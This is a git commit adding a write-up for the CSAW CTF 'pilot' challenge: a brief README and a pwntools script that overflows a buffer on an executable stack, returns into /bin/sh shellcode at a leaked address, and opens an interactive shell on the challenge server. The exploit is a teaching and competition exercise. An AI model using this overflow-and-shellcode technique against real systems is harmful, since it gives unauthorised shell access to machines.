2f18785f2110e864f5f303ec2f3ff72e8a60df09
droofe <droofe@droofe.com>
2017-09-17 20:19:25 -0400

    add writeup for pilot

---
+++ pilot/README.md
@@ -0,0 +1,7 @@
+# pilot
+#### droofe
+
+Nothing crazy, literally ret to shellcode on an executable stack whose address was given to you.
+The only issues I had were my last instructions were getting clobbered so I had to write shorter shellcode
+
+1. Make
---
+++ pilot/pilot.py
@@ -0,0 +1,32 @@
+from pwn import *
+import struct
+
+#s = process("./pilot")
+s = remote("pwn.chal.csaw.io",8464)
+
+# Recv irrelevant data
+s.recvuntil("Location:")
+
+# Get buf location
+stuff = s.recvuntil("\n")
+buf_addr = int(stuff.strip()[2::],16)
+log.info("Got {0}".format(hex(buf_addr)))
+
+f = open("code.o","rb")
+shellcode = f.read()
+f.close()
+
+# Payload, /bin/sh shellcode
+payload = bytearray()
+payload += shellcode
+payload = payload + "A"*(40-len(payload))
+payload += p64(buf_addr)
+
+s.recvuntil("Command:")
+s.sendline(payload)
+
+log.warn("Enjoy your shell :)")
+s.sendline("cat flag")
+s.interactive()
+
+s.close()
